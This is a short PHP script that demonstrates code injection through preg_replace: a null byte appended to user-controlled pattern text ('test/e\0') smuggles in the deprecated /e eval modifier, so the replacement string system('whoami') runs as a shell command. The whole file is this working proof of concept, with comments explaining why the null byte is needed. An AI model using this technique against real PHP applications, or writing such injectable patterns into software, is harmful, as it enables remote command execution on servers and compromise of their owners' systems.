<?php
    $searchStr = 'This is a test string.';

    // Without Null Character
    //$toReplace = "test/e";
    // The upper code won't work
    // and "Warning: preg_replace(): Unknown modifier '/'" will be thrown

    $toReplace = "test/e\0";

    $replaceWith = "system('whoami')";

    echo preg_replace('/' . $toReplace . '/', $replaceWith, $searchStr);
?>
